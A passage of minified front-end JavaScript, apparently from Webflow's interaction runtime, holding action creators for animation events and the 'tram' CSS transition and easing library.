      s = c.IX2_RAW_DATA_IMPORTED,
      u = c.IX2_SESSION_INITIALIZED,
      d = c.IX2_SESSION_STARTED,
      f = c.IX2_SESSION_STOPPED,
      l = c.IX2_PREVIEW_REQUESTED,
      p = c.IX2_PLAYBACK_REQUESTED,
      E = c.IX2_STOP_REQUESTED,
      v = c.IX2_CLEAR_REQUESTED,
      I = c.IX2_EVENT_LISTENER_ADDED,
      g = c.IX2_TEST_FRAME_RENDERED,
      y = c.IX2_EVENT_STATE_CHANGED,
      T = c.IX2_ANIMATION_FRAME_CHANGED,
      h = c.IX2_PARAMETER_CHANGED,
      _ = c.IX2_INSTANCE_ADDED,
      m = c.IX2_INSTANCE_STARTED,
      b = c.IX2_INSTANCE_REMOVED,
      O = c.IX2_ELEMENT_STATE_CHANGED,
      S = c.IX2_ACTION_LIST_PLAYBACK_CHANGED,
      L = c.IX2_VIEWPORT_WIDTH_CHANGED,
      A = c.IX2_MEDIA_QUERIES_DEFINED,
      w = o.IX2VanillaUtils.reifyState;
    (t.rawDataImported = function (e) {
      return { type: s, payload: (0, a.default)({}, w(e)) };
    }),
      (t.sessionInitialized = function (e) {
        var t = e.hasBoundaryNodes,
          n = e.reducedMotion;
        return { type: u, payload: { hasBoundaryNodes: t, reducedMotion: n } };
      }),
      (t.sessionStarted = function () {
        return { type: d };
      }),
      (t.sessionStopped = function () {
        return { type: f };
      }),
      (t.previewRequested = function (e) {
        var t = e.rawData,
          n = e.defer;
        return { type: l, payload: { defer: n, rawData: t } };
      }),
      (t.playbackRequested = function (e) {
        var t = e.actionTypeId,
          n = void 0 === t ? r.ActionTypeConsts.GENERAL_START_ACTION : t,
          i = e.actionListId,
          a = e.actionItemId,
          o = e.eventId,
          c = e.allowEvents,
          s = e.immediate,
          u = e.testManual,
          d = e.verbose,
          f = e.rawData;
        return {
          type: p,
          payload: {
            actionTypeId: n,
            actionListId: i,
            actionItemId: a,
            testManual: u,
            eventId: o,
            allowEvents: c,
            immediate: s,
            verbose: d,
            rawData: f,
          },
        };
      }),
      (t.stopRequested = function (e) {
        return { type: E, payload: { actionListId: e } };
      }),
      (t.clearRequested = function () {
        return { type: v };
      }),
      (t.eventListenerAdded = function (e, t) {
        return { type: I, payload: { target: e, listenerParams: t } };
      }),
      (t.testFrameRendered = function () {
        return {
          type: g,
          payload: {
            step:
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : 1,
          },
        };
      }),
      (t.eventStateChanged = function (e, t) {
        return { type: y, payload: { stateKey: e, newState: t } };
      }),
      (t.animationFrameChanged = function (e, t) {
        return { type: T, payload: { now: e, parameters: t } };
      }),
      (t.parameterChanged = function (e, t) {
        return { type: h, payload: { key: e, value: t } };
      }),
      (t.instanceAdded = function (e) {
        return { type: _, payload: (0, a.default)({}, e) };
      }),
      (t.instanceStarted = function (e, t) {
        return { type: m, payload: { instanceId: e, time: t } };
      }),
      (t.instanceRemoved = function (e) {
        return { type: b, payload: { instanceId: e } };
      }),
      (t.elementStateChanged = function (e, t, n, i) {
        return {
          type: O,
          payload: { elementId: e, actionTypeId: t, current: n, actionItem: i },
        };
      }),
      (t.actionListPlaybackChanged = function (e) {
        var t = e.actionListId,
          n = e.isPlaying;
        return { type: S, payload: { actionListId: t, isPlaying: n } };
      }),
      (t.viewportWidthChanged = function (e) {
        var t = e.width,
          n = e.mediaQueries;
        return { type: L, payload: { width: t, mediaQueries: n } };
      }),
      (t.mediaQueriesDefined = function () {
        return { type: A };
      });
  },
  function (e, t, n) {
    var i = n(126),
      a = n(66);
    function r(e, t) {
      (this.__wrapped__ = e),
        (this.__actions__ = []),
        (this.__chain__ = !!t),
        (this.__index__ = 0),
        (this.__values__ = void 0);
    }
    (r.prototype = i(a.prototype)),
      (r.prototype.constructor = r),
      (e.exports = r);
  },
  function (e, t) {
    e.exports = function () {};
  },
  function (e, t, n) {
    var i = n(126),
      a = n(66),
      r = 4294967295;
    function o(e) {
      (this.__wrapped__ = e),
        (this.__actions__ = []),
        (this.__dir__ = 1),
        (this.__filtered__ = !1),
        (this.__iteratees__ = []),
        (this.__takeCount__ = r),
        (this.__views__ = []);
    }
    (o.prototype = i(a.prototype)),
      (o.prototype.constructor = o),
      (e.exports = o);
  },
  function (e, t, n) {
    "use strict";
    var i = n(1)(n(17));
    window.tram = (function (e) {
      function t(e, t) {
        return new V.Bare().init(e, t);
      }
      function n(e) {
        return e.replace(/[A-Z]/g, function (e) {
          return "-" + e.toLowerCase();
        });
      }
      function a(e) {
        var t = parseInt(e.slice(1), 16);
        return [(t >> 16) & 255, (t >> 8) & 255, 255 & t];
      }
      function r(e, t, n) {
        return (
          "#" + ((1 << 24) | (e << 16) | (t << 8) | n).toString(16).slice(1)
        );
      }
      function o() {}
      function c(e, t, n) {
        u("Units do not match [" + e + "]: " + t + ", " + n);
      }
      function s(e, t, n) {
        if ((void 0 !== t && (n = t), void 0 === e)) return n;
        var i = n;
        return (
          Z.test(e) || !$.test(e)
            ? (i = parseInt(e, 10))
            : $.test(e) && (i = 1e3 * parseFloat(e)),
          0 > i && (i = 0),
          i == i ? i : n
        );
      }
      function u(e) {
        W.debug && window && window.console.warn(e);
      }
      var d = (function (e, t, n) {
          function a(e) {
            return "object" == (0, i.default)(e);
          }
          function r(e) {
            return "function" == typeof e;
          }
          function o() {}
          return function n(i, c) {
            function s() {
              var e = new u();
              return r(e.init) && e.init.apply(e, arguments), e;
            }
            function u() {}
            undefined === c && ((c = i), (i = Object)), (s.Bare = u);
            var d,
              f = (o[e] = i[e]),
              l = (u[e] = s[e] = new o());
            return (
              (l.constructor = s),
              (s.mixin = function (t) {
                return (u[e] = s[e] = n(s, t)[e]), s;
              }),
              (s.open = function (e) {
                if (
                  ((d = {}),
                  r(e) ? (d = e.call(s, l, f, s, i)) : a(e) && (d = e),
                  a(d))
                )
                  for (var n in d) t.call(d, n) && (l[n] = d[n]);
                return r(l.init) || (l.init = i), s;
              }),
              s.open(c)
            );
          };
        })("prototype", {}.hasOwnProperty),
        f = {
          ease: [
            "ease",
            function (e, t, n, i) {
              var a = (e /= i) * e,
                r = a * e;
              return (
                t +
                n * (-2.75 * r * a + 11 * a * a + -15.5 * r + 8 * a + 0.25 * e)
              );
            },
          ],
          "ease-in": [
            "ease-in",
            function (e, t, n, i) {
              var a = (e /= i) * e,
                r = a * e;
              return t + n * (-1 * r * a + 3 * a * a + -3 * r + 2 * a);
            },
          ],
          "ease-out": [
            "ease-out",
            function (e, t, n, i) {
              var a = (e /= i) * e,
                r = a * e;
              return (
                t +
                n * (0.3 * r * a + -1.6 * a * a + 2.2 * r + -1.8 * a + 1.9 * e)
              );
            },
          ],
          "ease-in-out": [
            "ease-in-out",
            function (e, t, n, i) {
              var a = (e /= i) * e,
                r = a * e;
              return t + n * (2 * r * a + -5 * a * a + 2 * r + 2 * a);
            },
          ],
          linear: [
            "linear",
            function (e, t, n, i) {
              return (n * e) / i + t;
            },
          ],
          "ease-in-quad": [
            "cubic-bezier(0.550, 0.085, 0.680, 0.530)",
            function (e, t, n, i) {
              return n * (e /= i) * e + t;
            },
          ],
          "ease-out-quad": [
            "cubic-bezier(0.250, 0.460, 0.450, 0.940)",
            function (e, t, n, i) {
              return -n * (e /= i) * (e - 2) + t;
            },
          ],
          "ease-in-out-quad": [
            "cubic-bezier(0.455, 0.030, 0.515, 0.955)",
            function (e, t, n, i) {
              return (e /= i / 2) < 1
                ? (n / 2) * e * e + t
                : (-n / 2) * (--e * (e - 2) - 1) + t;
            },
          ],
          "ease-in-cubic": [
            "cubic-bezier(0.550, 0.055, 0.675, 0.190)",
            function (e, t, n, i) {
              return n * (e /= i) * e * e + t;
            },
          ],
          "ease-out-cubic": [
            "cubic-bezier(0.215, 0.610, 0.355, 1)",
            function (e, t, n, i) {
              return n * ((e = e / i - 1) * e * e + 1) + t;
            },
          ],
          "ease-in-out-cubic": [
            "cubic-bezier(0.645, 0.045, 0.355, 1)",
            function (e, t, n, i) {
              return (e /= i / 2) < 1
                ? (n / 2) * e * e * e + t
                : (n / 2) * ((e -= 2) * e * e + 2) + t;
            },
          ],
          "ease-in-quart": [
            "cubic-bezier(0.895, 0.030, 0.685, 0.220)",
            function (e, t, n, i) {
              return n * (e /= i) * e * e * e + t;
            },
          ],
          "ease-out-quart": [
            "cubic-bezier(0.165, 0.840, 0.440, 1)",
            function (e, t, n, i) {
              return -n * ((e = e / i - 1) * e * e * e - 1) + t;
            },
          ],
          "ease-in-out-quart": [
            "cubic-bezier(0.770, 0, 0.175, 1)",
            function (e, t, n, i) {
              return (e /= i / 2) < 1
                ? (n / 2) * e * e * e * e + t
                : (-n / 2) * ((e -= 2) * e * e * e - 2) + t;
            },
          ],
          "ease-in-quint": [
            "cubic-bezier(0.755, 0.050, 0.855, 0.060)",
            function (e, t, n, i) {
              return n * (e /= i) * e * e * e * e + t;
            },
          ],
          "ease-out-quint": [
            "cubic-bezier(0.230, 1, 0.320, 1)",
            function (e, t, n, i) {
              return n * ((e = e / i - 1) * e * e * e * e + 1) + t;
            },
          ],
          "ease-in-out-quint": [
            "cubic-bezier(0.860, 0, 0.070, 1)",
            function (e, t, n, i) {
              return (e /= i / 2) < 1
                ? (n / 2) * e * e * e * e * e + t
                : (n / 2) * ((e -= 2) * e * e * e * e + 2) + t;
            },
          ],
          "ease-in-sine": [
            "cubic-bezier(0.470, 0, 0.745, 0.715)",
            function (e, t, n, i) {
              return -n * Math.cos((e / i) * (Math.PI / 2)) + n + t;
            },
          ],
          "ease-out-sine": [
            "cubic-bezier(0.390, 0.575, 0.565, 1)",
            function (e, t, n, i) {
              return n * Math.sin((e / i) * (Math.PI / 2)) + t;
            },
          ],
          "ease-in-out-sine": [
            "cubic-bezier(0.445, 0.050, 0.550, 0.950)",
            function (e, t, n, i) {
              return (-n / 2) * (Math.cos((Math.PI * e) / i) - 1) + t;
            },
          ],
          "ease-in-expo": [
            "cubic-bezier(0.950, 0.050, 0.795, 0.035)",
            function (e, t, n, i) {
              return 0 === e ? t : n * Math.pow(2, 10 * (e / i - 1)) + t;
            },
          ],
          "ease-out-expo": [
            "cubic-bezier(0.190, 1, 0.220, 1)",
            function (e, t, n, i) {
              return e === i ? t + n : n * (1 - Math.pow(2, (-10 * e) / i)) + t;
            },
          ],
          "ease-in-out-expo": [
            "cubic-bezier(1, 0, 0, 1)",
            function (e, t, n, i) {
              return 0 === e
                ? t
                : e === i
                ? t + n
                : (e /= i / 2) < 1
                ? (n / 2) * Math.pow(2, 10 * (e - 1)) + t
                : (n / 2) * (2 - Math.pow(2, -10 * --e)) + t;
            },
          ],
          "ease-in-circ": [
            "cubic-bezier(0.600, 0.040, 0.980, 0.335)",
            function (e, t, n, i) {
              return -n * (Math.sqrt(1 - (e /= i) * e) - 1) + t;
            },
          ],
          "ease-out-circ": [
            "cubic-bezier(0.075, 0.820, 0.165, 1)",
            function (e, t, n, i) {
              return n * Math.sqrt(1 - (e = e / i - 1) * e) + t;
            },
          ],
          "ease-in-out-circ": [
            "cubic-bezier(0.785, 0.135, 0.150, 0.860)",
            function (e, t, n, i) {
              return (e /= i / 2) < 1
                ? (-n / 2) * (Math.sqrt(1 - e * e) - 1) + t
                : (n / 2) * (Math.sqrt(1 - (e -= 2) * e) + 1) + t;
            },
          ],
          "ease-in-back": [
            "cubic-bezier(0.600, -0.280, 0.735, 0.045)",
            function (e, t, n, i, a) {
              return (
                void 0 === a && (a = 1.70158),
                n * (e /= i) * e * ((a + 1) * e - a) + t
              );
            },
          ],
          "ease-out-back": [
            "cubic-bezier(0.175, 0.885, 0.320, 1.275)",
            function (e, t, n, i, a) {
              return (
                void 0 === a && (a = 1.70158),
                n * ((e = e / i - 1) * e * ((a + 1) * e + a) + 1) + t
              );
            },
          ],
          "ease-in-out-back": [
            "cubic-bezier(0.680, -0.550, 0.265, 1.550)",
            function (e, t, n, i, a) {
              return (
                void 0 === a && (a = 1.70158),
                (e /= i / 2) < 1
                  ? (n / 2) * e * e * ((1 + (a *= 1.525)) * e - a) + t
                  : (n / 2) *
                      ((e -= 2) * e * ((1 + (a *= 1.525)) * e + a) + 2) +
                    t
              );
            },
          ],
        },
        l = {
          "ease-in-back": "cubic-bezier(0.600, 0, 0.735, 0.045)",
          "ease-out-back": "cubic-bezier(0.175, 0.885, 0.320, 1)",
          "ease-in-out-back": "cubic-bezier(0.680, 0, 0.265, 1)",
        },
        p = document,
        E = window,
        v = "bkwld-tram",
        I = /[\-\.0-9]/g,
        g = /[A-Z]/,
        y = "number",
        T = /^(rgb|#)/,
        h = /(em|cm|mm|in|pt|pc|px)$/,
        _ = /(em|cm|mm|in|pt|pc|px|%)$/,
        m = /(deg|rad|turn)$/,
        b = "unitless",
        O = /(all|none) 0s ease 0s/,
        S = /^(width|height)$/,
        L = " ",
        A = p.createElement("a"),
        w = ["Webkit", "Moz", "O", "ms"],
        R = ["-webkit-", "-moz-", "-o-", "-ms-"],
        N = function (e) {
          if (e in A.style) return { dom: e, css: e };
          var t,
            n,
            i = "",
            a = e.split("-");
          for (t = 0; t < a.length; t++)
            i += a[t].charAt(0).toUpperCase() + a[t].slice(1);
          for (t = 0; t < w.length; t++)
            if ((n = w[t] + i) in A.style) return { dom: n, css: R[t] + e };
        },
        C = (t.support = {
          bind: Function.prototype.bind,
          transform: N("transform"),
          transition: N("transition"),
          backface: N("backface-visibility"),
          timing: N("transition-timing-function"),
        });
      if (C.transition) {
        var x = C.timing.dom;
        if (((A.style[x] = f["ease-in-back"][0]), !A.style[x]))
          for (var M in l) f[M][0] = l[M];
      }
      var P = (t.frame = (function () {
          var e =
            E.requestAnimationFrame ||
            E.webkitRequestAnimationFrame ||
            E.mozRequestAnimationFrame ||
            E.oRequestAnimationFrame ||
            E.msRequestAnimationFrame;
          return e && C.bind
            ? e.bind(E)
            : function (e) {
                E.setTimeout(e, 16);
              };
        })()),
        D = (t.now = (function () {
          var e = E.performance,
            t = e && (e.now || e.webkitNow || e.msNow || e.mozNow);
          return t && C.bind
            ? t.bind(e)
            : Date.now ||
                function () {
                  return +new Date();
                };
        })()),
        F = d(function (t) {
          function a(e, t) {
            var n = (function (e) {
                for (var t = -1, n = e ? e.length : 0, i = []; ++t < n; ) {
                  var a = e[t];
                  a && i.push(a);
                }
                return i;
              })(("" + e).split(L)),
              i = n[0];
            t = t || {};
            var a = K[i];
            if (!a) return u("Unsupported property: " + i);
            if (!t.weak || !this.props[i]) {
              var r = a[0],
                o = this.props[i];
              return (
                o || (o = this.props[i] = new r.Bare()),
                o.init(this.$el, n, a, t),
                o
              );
            }
          }
          function r(e, t, n) {
            if (e) {
              var r = (0, i.default)(e);
              if (
                (t ||
                  (this.timer && this.timer.destroy(),
                  (this.queue = []),
                  (this.active = !1)),
                "number" == r && t)
              )
                return (
                  (this.timer = new X({
                    duration: e,
                    context: this,
                    complete: o,
                  })),
                  void (this.active = !0)
                );
              if ("string" == r && t) {
                switch (e) {
                  case "hide":
                    d.call(this);
                    break;
                  case "stop":
                    c.call(this);
                    break;
                  case "redraw":
                    f.call(this);
                    break;
                  default:
                    a.call(this, e, n && n[1]);
                }
                return o.call(this);
              }
              if ("function" == r) return void e.call(this, this);
              if ("object" == r) {
                var u = 0;
                p.call(
                  this,
                  e,
                  function (e, t) {
                    e.span > u && (u = e.span), e.stop(), e.animate(t);
                  },
                  function (e) {
                    "wait" in e && (u = s(e.wait, 0));
                  }
                ),
                  l.call(this),
                  u > 0 &&
                    ((this.timer = new X({ duration: u, context: this })),
                    (this.active = !0),
                    t && (this.timer.complete = o));
                var E = this,
                  v = !1,
                  I = {};
                P(function () {
                  p.call(E, e, function (e) {
                    e.active && ((v = !0), (I[e.name] = e.nextStyle));
                  }),
                    v && E.$el.css(I);
                });
              }
            }
          }
          function o() {
            if (
              (this.timer && this.timer.destroy(),
              (this.active = !1),
              this.queue.length)
            ) {
              var e = this.queue.shift();
              r.call(this, e.options, !0, e.args);
            }
          }
          function c(e) {
            var t;
            this.timer && this.timer.destroy(),
              (this.queue = []),
              (this.active = !1),
              "string" == typeof e
                ? ((t = {})[e] = 1)
                : (t =
                    "object" == (0, i.default)(e) && null != e
                      ? e
                      : this.props),
              p.call(this, t, E),
              l.call(this);
          }
          function d() {
            c.call(this), (this.el.style.display = "none");
          }
          function f() {
            this.el.offsetHeight;
          }
          function l() {
            var e,
              t,
              n = [];
            for (e in (this.upstream && n.push(this.upstream), this.props))
              (t = this.props[e]).active && n.push(t.string);
            (n = n.join(",")),
              this.style !== n &&
                ((this.style = n), (this.el.style[C.transition.dom] = n));
          }
          function p(e, t, i) {
            var r,
              o,
              c,
              s,
              u = t !== E,
              d = {};
            for (r in e)
              (c = e[r]),
                r in q
                  ? (d.transform || (d.transform = {}), (d.transform[r] = c))
                  : (g.test(r) && (r = n(r)),
                    r in K ? (d[r] = c) : (s || (s = {}), (s[r] = c)));
            for (r in d) {
              if (((c = d[r]), !(o = this.props[r]))) {
                if (!u) continue;
                o = a.call(this, r);
              }
              t.call(this, o, c);
            }
            i && s && i.call(this, s);
          }
          function E(e) {
            e.stop();
          }
          function I(e, t) {
            e.set(t);
          }
          function y(e) {
            this.$el.css(e);
          }
          function T(e, n) {
            t[e] = function () {
              return this.children
                ? function (e, t) {
                    var n,
                      i = this.children.length;
                    for (n = 0; i > n; n++) e.apply(this.children[n], t);
                    return this;
                  }.call(this, n, arguments)
                : (this.el && n.apply(this, arguments), this);
            };
          }
          (t.init = function (t) {
            if (
              ((this.$el = e(t)),
              (this.el = this.$el[0]),
              (this.props = {}),
              (this.queue = []),
              (this.style = ""),
              (this.active = !1),
              W.keepInherited && !W.fallback)
            ) {
              var n = Q(this.el, "transition");
              n && !O.test(n) && (this.upstream = n);
            }
            C.backface &&
              W.hideBackface &&
              z(this.el, C.backface.css, "hidden");
          }),
            T("add", a),
            T("start", r),
            T("wait", function (e) {
              (e = s(e, 0)),
                this.active
                  ? this.queue.push({ options: e })
                  : ((this.timer = new X({
                      duration: e,
                      context: this,
                      complete: o,
                    })),
                    (this.active = !0));
            }),
            T("then", function (e) {
              return this.active
                ? (this.queue.push({ options: e, args: arguments }),
                  void (this.timer.complete = o))
                : u(
                    "No active transition timer. Use start() or wait() before then()."
                  );
            }),
            T("next", o),
            T("stop", c),
            T("set", function (e) {
              c.call(this, e), p.call(this, e, I, y);
            }),
            T("show", function (e) {
              "string" != typeof e && (e = "block"),
                (this.el.style.display = e);
            }),
            T("hide", d),
            T("redraw", f),
            T("destroy", function () {
              c.call(this),
                e.removeData(this.el, v),
                (this.$el = this.el = null);
            });
        }),
        V = d(F, function (t) {
          function n(t, n) {
            var i = e.data(t, v) || e.data(t, v, new F.Bare());
            return i.el || i.init(t), n ? i.start(n) : i;
          }
          t.init = function (t, i) {
            var a = e(t);
            if (!a.length) return this;
            if (1 === a.length) return n(a[0], i);
            var r = [];
            return (
              a.each(function (e, t) {
                r.push(n(t, i));
              }),
              (this.children = r),
              this
            );
          };
        }),
        U = d(function (e) {
          function t() {
            var e = this.get();
            this.update("auto");
            var t = this.get();
            return this.update(e), t;
          }
          function n(e) {
            var t = /rgba?\((\d+),\s*(\d+),\s*(\d+)/.exec(e);
            return (t ? r(t[1], t[2], t[3]) : e).replace(
              /#(\w)(\w)(\w)$/,
              "#$1$1$2$2$3$3"
            );
          }
          (e.init = function (e, t, n, i) {
            (this.$el = e), (this.el = e[0]);
            var a = t[0];
            n[2] && (a = n[2]),
              H[a] && (a = H[a]),
              (this.name = a),
              (this.type = n[1]),
              (this.duration = s(t[1], this.duration, 500)),
              (this.ease = (function (e, t, n) {
                return void 0 !== t && (n = t), e in f ? e : n;
              })(t[2], this.ease, "ease")),
              (this.delay = s(t[3], this.delay, 0)),
              (this.span = this.duration + this.delay),
              (this.active = !1),
              (this.nextStyle = null),
              (this.auto = S.test(this.name)),
              (this.unit = i.unit || this.unit || W.defaultUnit),
              (this.angle = i.angle || this.angle || W.defaultAngle),
              W.fallback || i.fallback
                ? (this.animate = this.fallback)
                : ((this.animate = this.transition),
                  (this.string =
                    this.name +
                    L +
                    this.duration +
                    "ms" +
                    ("ease" != this.ease ? L + f[this.ease][0] : "") +
                    (this.delay ? L + this.delay + "ms" : "")));
          }),
            (e.set = function (e) {
              (e = this.convert(e, this.type)), this.update(e), this.redraw();
            }),
            (e.transition = function (e) {
              (this.active = !0),
                (e = this.convert(e, this.type)),
                this.auto &&
                  ("auto" == this.el.style[this.name] &&
                    (this.update(this.get()), this.redraw()),
                  "auto" == e && (e = t.call(this))),
                (this.nextStyle = e);
            }),
            (e.fallback = function (e) {
              var n =
                this.el.style[this.name] || this.convert(this.get(), this.type);
              (e = this.convert(e, this.type)),
                this.auto &&
                  ("auto" == n && (n = this.convert(this.get(), this.type)),
                  "auto" == e && (e = t.call(this))),
                (this.tween = new j({
                  from: n,
                  to: e,
                  duration: this.duration,
                  delay: this.delay,
                  ease: this.ease,
                  update: this.update,
                  context: this,
                }));
            }),
            (e.get = function () {
              return Q(this.el, this.name);
            }),
            (e.update = function (e) {
              z(this.el, this.name, e);
            }),
            (e.stop = function () {
              (this.active || this.nextStyle) &&
                ((this.active = !1),
                (this.nextStyle = null),
                z(this.el, this.name, this.get()));
              var e = this.tween;
              e && e.context && e.destroy();
            }),
            (e.convert = function (e, t) {
              if ("auto" == e && this.auto) return e;
              var a,
                r = "number" == typeof e,
                o = "string" == typeof e;
              switch (t) {
                case y:
                  if (r) return e;
                  if (o && "" === e.replace(I, "")) return +e;
                  a = "number(unitless)";
                  break;
                case T:
                  if (o) {
                    if ("" === e && this.original) return this.original;
                    if (t.test(e))
                      return "#" == e.charAt(0) && 7 == e.length ? e : n(e);
                  }
                  a = "hex or rgb string";
                  break;
                case h:
                  if (r) return e + this.unit;
                  if (o && t.test(e)) return e;
                  a = "number(px) or string(unit)";
                  break;
                case _:
                  if (r) return e + this.unit;
                  if (o && t.test(e)) return e;
                  a = "number(px) or string(unit or %)";
                  break;
                case m:
                  if (r) return e + this.angle;
                  if (o && t.test(e)) return e;
                  a = "number(deg) or string(angle)";
                  break;
                case b:
                  if (r) return e;
                  if (o && _.test(e)) return e;
                  a = "number(unitless) or string(unit or %)";
              }
              return (
                (function (e, t) {
                  u(
                    "Type warning: Expected: [" +
                      e +
                      "] Got: [" +
                      (0, i.default)(t) +
                      "] " +
                      t
                  );
                })(a, e),
                e
              );
            }),
            (e.redraw = function () {
              this.el.offsetHeight;
            });
        }),
        k = d(U, function (e, t) {
          e.init = function () {
            t.init.apply(this, arguments),
              this.original || (this.original = this.convert(this.get(), T));
          };
        }),
        G = d(U, function (e, t) {
          (e.init = function () {
            t.init.apply(this, arguments), (this.animate = this.fallback);
          }),
            (e.get = function () {
              return this.$el[this.name]();
            }),
            (e.update = function (e) {
              this.$el[this.name](e);
            });
        }),
        B = d(U, function (e, t) {
          function n(e, t) {
            var n, i, a, r, o;
            for (n in e)
              (a = (r = q[n])[0]),
                (i = r[1] || n),
                (o = this.convert(e[n], a)),
                t.call(this, i, o, a);
          }
          (e.init = function () {
            t.init.apply(this, arguments),
              this.current ||
                ((this.current = {}),
                q.perspective &&
                  W.perspective &&
                  ((this.current.perspective = W.perspective),
                  z(this.el, this.name, this.style(this.current)),
                  this.redraw()));
          }),
            (e.set = function (e) {
              n.call(this, e, function (e, t) {
                this.current[e] = t;
              }),
                z(this.el, this.name, this.style(this.current)),
                this.redraw();
            }),
            (e.transition = function (e) {
              var t = this.values(e);
              this.tween = new Y({
                current: this.current,
                values: t,
                duration: this.duration,
                delay: this.delay,
                ease: this.ease,
              });
              var n,
                i = {};
              for (n in this.current) i[n] = n in t ? t[n] : this.current[n];
              (this.active = !0), (this.nextStyle = this.style(i));
            }),
            (e.fallback = function (e) {
              var t = this.values(e);
              this.tween = new Y({
                current: this.current,
                values: t,
                duration: this.duration,
                delay: this.delay,
                ease: this.ease,
                update: this.update,
                context: this,
              });
            }),
            (e.update = function () {
              z(this.el, this.name, this.style(this.current));
            }),
            (e.style = function (e) {
              var t,
                n = "";
              for (t in e) n += t + "(" + e[t] + ") ";
              return n;
            }),
            (e.values = function (e) {
              var t,
                i = {};
              return (
                n.call(this, e, function (e, n, a) {
                  (i[e] = n),
                    void 0 === this.current[e] &&
                      ((t = 0),
                      ~e.indexOf("scale") && (t = 1),
                      (this.current[e] = this.convert(t, a)));
                }),
                i
              );
            });
        }),
        j = d(function (t) {
          function n() {
            var e,
              t,
              i,
              a = s.length;
            if (a) for (P(n), t = D(), e = a; e--; ) (i = s[e]) && i.render(t);
          }
          var i = { ease: f.ease[1], from: 0, to: 1 };
          (t.init = function (e) {
            (this.duration = e.duration || 0), (this.delay = e.delay || 0);
            var t = e.ease || i.ease;
            f[t] && (t = f[t][1]),
              "function" != typeof t && (t = i.ease),
              (this.ease = t),
              (this.update = e.update || o),
              (this.complete = e.complete || o),
              (this.context = e.context || this),
              (this.name = e.name);
            var n = e.from,
              a = e.to;
            void 0 === n && (n = i.from),
              void 0 === a && (a = i.to),
              (this.unit = e.unit || ""),
              "number" == typeof n && "number" == typeof a
                ? ((this.begin = n), (this.change = a - n))
                : this.format(a, n),
              (this.value = this.begin + this.unit),
              (this.start = D()),
              !1 !== e.autoplay && this.play();
          }),
            (t.play = function () {
              this.active ||
                (this.start || (this.start = D()),
                (this.active = !0),
                this,
                1 === s.push(this) && P(n));
            }),
            (t.stop = function () {
              var t, n;
              this.active &&
                ((this.active = !1),
                this,
                (n = e.inArray(this, s)) >= 0 &&
                  ((t = s.slice(n + 1)),
                  (s.length = n),
                  t.length && (s = s.concat(t))));
            }),
            (t.render = function (e) {
              var t,
                n = e - this.start;
              if (this.delay) {
                if (n <= this.delay) return;
                n -= this.delay;
              }
              if (n < this.duration) {
                var i = this.ease(n, 0, 1, this.duration);
                return (
                  (t = this.startRGB
                    ? (function (e, t, n) {
                        return r(
                          e[0] + n * (t[0] - e[0]),
                          e[1] + n * (t[1] - e[1]),
                          e[2] + n * (t[2] - e[2])
                        );
                      })(this.startRGB, this.endRGB, i)
                    : (function (e) {
                        return Math.round(e * u) / u;
                      })(this.begin + i * this.change)),
                  (this.value = t + this.unit),
                  void this.update.call(this.context, this.value)
                );
              }
              (t = this.endHex || this.begin + this.change),
                (this.value = t + this.unit),
                this.update.call(this.context, this.value),
                this.complete.call(this.context),
                this.destroy();
            }),
            (t.format = function (e, t) {
              if (((t += ""), "#" == (e += "").charAt(0)))
                return (
                  (this.startRGB = a(t)),
                  (this.endRGB = a(e)),
                  (this.endHex = e),
                  (this.begin = 0),
                  void (this.change = 1)
                );
              if (!this.unit) {
                var n = t.replace(I, "");
                n !== e.replace(I, "") && c("tween", t, e), (this.unit = n);
              }
              (t = parseFloat(t)),
                (e = parseFloat(e)),
                (this.begin = this.value = t),
                (this.change = e - t);
            }),
            (t.destroy = function () {
              this.stop(),
                (this.context = null),
                (this.ease = this.update = this.complete = o);
            });
          var s = [],
            u = 1e3;
        }),
        X = d(j, function (e) {
          (e.init = function (e) {
            (this.duration = e.duration || 0),
              (this.complete = e.complete || o),
              (this.context = e.context),
              this.play();
          }),
            (e.render = function (e) {
              e - this.start < this.duration ||
                (this.complete.call(this.context), this.destroy());
            });
        }),
        Y = d(j, function (e, t) {
          (e.init = function (e) {
            var t, n;
            for (t in ((this.context = e.context),
            (this.update = e.update),
            (this.tweens = []),
            (this.current = e.current),
            e.values))
              (n = e.values[t]),
                this.current[t] !== n &&
                  this.tweens.push(
                    new j({
                      name: t,
                      from: this.current[t],
                      to: n,
                      duration: e.duration,
                      delay: e.delay,
                      ease: e.ease,
                      autoplay: !1,
                    })
                  );
            this.play();
          }),
            (e.render = function (e) {
              var t,
                n,
                i = !1;
              for (t = this.tweens.length; t--; )
                (n = this.tweens[t]).context &&
                  (n.render(e), (this.current[n.name] = n.value), (i = !0));
              return i
                ? void (this.update && this.update.call(this.context))
                : this.destroy();
            }),
            (e.destroy = function () {
              if ((t.destroy.call(this), this.tweens)) {
                var e;
                for (e = this.tweens.length; e--; ) this.tweens[e].destroy();
                (this.tweens = null), (this.current = null);
              }
            });
        }),
        W = (t.config = {
          debug: !1,
          defaultUnit: "px",
          defaultAngle: "deg",
          keepInherited: !1,
          hideBackface: !1,
          perspective: "",
          fallback: !C.transition,
          agentTests: [],
        });
      (t.fallback = function (e) {
        if (!C.transition) return (W.fallback = !0);
        W.agentTests.push("(" + e + ")");
        var t = new RegExp(W.agentTests.join("|"), "i");
        W.fallback = t.test(navigator.userAgent);
      }),
        t.fallback("6.0.[2-5] Safari"),
        (t.tween = function (e) {
          return new j(e);
        }),
        (t.delay = function (e, t, n) {
          return new X({ complete: t, duration: e, context: n });
        }),
        (e.fn.tram = function (e) {
          return t.call(null, this, e);
        });
      var z = e.style,
        Q = e.css,
        H = { transform: C.transform && C.transform.css },
        K = {
          color: [k, T],
          background: [k, T, "background-color"],
          "outline-color": [k, T],
          "border-color": [k, T],
          "border-top-color": [k, T],
          "border-right-color": [k, T],
          "border-bottom-color": [k, T],
          "border-left-color": [k, T],
          "border-width": [U, h],
          "border-top-width": [U, h],
          "border-right-width": [U, h],
          "border-bottom-width": [U, h],
          "border-left-width": [U, h],
          "border-spacing": [U, h],
          "letter-spacing": [U, h],
          margin: [U, h],
          "margin-top": [U, h],
          "margin-right": [U, h],
          "margin-bottom": [U, h],
          "margin-left": [U, h],
          padding: [U, h],
          "padding-top": [U, h],
          "padding-right": [U, h],
          "padding-bottom": [U, h],
          "padding-left": [U, h],
          "outline-width": [U, h],
          opacity: [U, y],
          top: [U, _],
          right: [U, _],
          bottom: [U, _],
          left: [U, _],
          "font-size": [U, _],
          "text-indent": [U, _],
          "word-spacing": [U, _],
          width: [U, _],
          "min-width": [U, _],
          "max-width": [U, _],
          height: [U, _],
